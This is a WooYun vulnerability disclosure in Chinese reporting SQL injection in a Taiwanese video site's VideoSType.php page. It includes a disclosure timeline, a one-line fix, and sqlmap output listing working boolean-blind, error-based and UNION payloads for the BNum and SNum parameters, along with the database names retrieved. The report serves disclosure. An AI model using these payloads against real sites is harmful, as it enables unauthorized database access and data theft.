wybug_title: FG影音美人教室sql注射（臺灣地區）
wybug_corp: 風尚數位科技股份有限公司

wybug_detail:
漏洞详情 披露状态：   									2015-12-15：	细节已通知厂商并且等待厂商处理中									2015-12-16：	厂商已经确认，细节仅向厂商公开									2015-12-26：	细节向核心白帽子及相关领域专家公开									2016-01-05：	细节向普通白帽子公开									2016-01-15：	细节向实习白帽子公开									2016-01-20：	厂商已经修复漏洞并主动公开，细节向公众公开  简要描述：  详细说明：  FG影音美人教室sql注射链接:http://**.**.**.**/VideoSType.php?from=top10&BNum=1&SNum=2注入参数：Parameter: BNum (GET)    Type: boolean-based blind    Title: MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)    Payload: from=top10&BNum=1 RLIKE (SELECT (CASE WHEN (2244=2244) THEN 1 ELSE 0x28 END))&SNum=2   漏洞证明：  Parameter: BNum (GET)    Type: boolean-based blind    Title: MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)    Payload: from=top10&BNum=1 RLIKE (SELECT (CASE WHEN (2244=2244) THEN 1 ELSE 0x28 END))&SNum=2    Type: error-based    Title: MySQL >= 5.1 OR error-based - WHERE or HAVING clause (EXTRACTVALUE)    Payload: from=top10&BNum=1 OR EXTRACTVALUE(9620,CONCAT(0x5c,0x716a627a71,(SELECT (CASE WHEN (9620=9620) THEN 1 ELSE 0 END)),0x71707a6271))&SNum=2    Type: UNION query    Title: MySQL UNION query (NULL) - 7 columns    Payload: from=top10&BNum=-3795 UNION ALL SELECT NULL,CONCAT(0x716a627a71,0x746f5a59554c72666873,0x71707a6271),NULL,NULL,NULL,NULL,NULL#&SNum=2Parameter: SNum (GET)    Type: boolean-based blind    Title: MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)    Payload: from=top10&BNum=1&SNum=2 RLIKE (SELECT (CASE WHEN (7011=7011) THEN 2 ELSE 0x28 END))    Type: error-based    Title: MySQL >= 5.1 OR error-based - WHERE or HAVING clause (EXTRACTVALUE)    Payload: from=top10&BNum=1&SNum=2 OR EXTRACTVALUE(1636,CONCAT(0x5c,0x716a627a71,(SELECT (CASE WHEN (1636=1636) THEN 1 ELSE 0 END)),0x71707a6271))---there were multiple injection points, please select the one to use for following injections:[0] place: GET, parameter: BNum, type: Unescaped numeric (default)[1] place: GET, parameter: SNum, type: Unescaped numeric[q] Quit> 0[22:30:56] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL 5.1[22:30:56] [INFO] fetching database names[22:30:57] [INFO] the SQL query used returns 2 entries[22:30:59] [INFO] retrieved: information_schema[22:31:01] [INFO] retrieved: videoavailable databases [2]:[*] information_schema[*] video

   修复方案：  参数过滤！   版权声明：转载请注明来源 路人甲@乌云
